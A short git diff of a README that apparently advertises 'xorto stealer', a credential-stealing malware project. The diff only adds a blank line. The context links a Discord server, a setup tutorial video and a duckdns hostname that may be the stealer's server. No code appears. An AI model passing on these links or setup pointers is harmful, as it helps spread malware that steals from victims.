@@ -5,6 +5,7 @@
 </h1>
 https://discord.gg/pqwdp4qYBj
 Don't forget to star for new updates
+
 ## How to Setup?
 - Tutorial video on setting up xorto stealer https://streamable.com/poheqt
 - xortoproject1.duckdns.org
